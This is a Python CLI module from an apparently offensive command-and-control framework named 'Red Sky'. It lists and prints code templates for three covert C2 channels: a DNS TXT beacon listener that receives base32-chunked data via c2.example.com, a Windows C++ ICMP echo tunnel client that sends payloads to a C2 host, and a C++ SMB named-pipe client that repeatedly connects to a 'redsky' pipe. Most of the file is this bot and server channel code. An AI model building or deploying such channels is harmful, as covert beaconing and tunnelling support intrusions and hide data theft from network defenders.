# language: Python, file: Program/c2/channels.py, target: Red Sky c2 — alternate channels

import sys
from typing import List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv


CHANNELS = {
    "dns":  "DNS TXT beacon — requires a real domain with authoritative NS",
    "icmp": "ICMP echo tunnel — requires root on both ends",
    "smb":  "Named pipe over SMB — internal engagements only",
}

DNS_CODE = '''# DNS TXT beacon listener (server side)
# Bot sends: <seq>.<base32-chunk>.c2.example.com
# Requires: authoritative NS for the zone pointing at your C2 IP.
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, TXT, QTYPE

class RedSkyResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".")
        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("noop")))
        return reply

DNSServer(RedSkyResolver(), port=53, address="0.0.0.0").start_thread()
'''

ICMP_CODE = '''// ICMP tunnel client (bot side) - C++
#include <winsock2.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#pragma comment(lib, "iphlpapi.lib")

void SendIcmpC2(const char* host, const BYTE* payload, DWORD len) {
    HANDLE h = IcmpCreateFile();
    if (h == INVALID_HANDLE_VALUE) return;
    in_addr dst; InetPtonA(AF_INET, host, &dst);
    BYTE reply[1024];
    IcmpSendEcho(h, dst.S_un.S_addr, (LPVOID)payload, (WORD)len,
                 nullptr, reply, sizeof(reply), 2000);
    IcmpCloseHandle(h);
}
'''

SMB_CODE = '''// Named pipe C2 (internal use) - C++
#include <windows.h>

HANDLE OpenC2Pipe(const char* server) {
    char path[256];
    snprintf(path, sizeof(path), "\\\\\\\\%s\\\\pipe\\\\redsky", server);
    for (int i = 0; i < 10; ++i) {
        HANDLE h = CreateFileA(path, GENERIC_READ | GENERIC_WRITE,
                               0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (h != INVALID_HANDLE_VALUE) return h;
        Sleep(5000);
    }
    return INVALID_HANDLE_VALUE;
}
'''


def cmd_list() -> int:
    print_info(f"{len(CHANNELS)} alternate C2 channels")
    print()
    for name, desc in CHANNELS.items():
        print(f"  {ARTERY}▓{RESET} {BONE}{name:<8}{RESET} {ASH}{desc}{RESET}")
    print()
    print_warn("all channels require configuration and are disabled by default")
    return 0


def cmd_show(name: str) -> int:
    if name not in CHANNELS:
        print_err(f"unknown channel: {name}")
        print_info(f"available: {', '.join(CHANNELS.keys())}")
        return 2
    code = {"dns": DNS_CODE, "icmp": ICMP_CODE, "smb": SMB_CODE}[name]
    print(f"{ARTERY}{BOLD}-- {name} channel{RESET}")
    print(code)
    return 0


def run_cli(args: List[str]) -> int:
    if not args or args[0] == "list":
        return cmd_list()
    if args[0] == "show" and len(args) > 1:
        return cmd_show(args[1])
    return cmd_show(args[0])


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
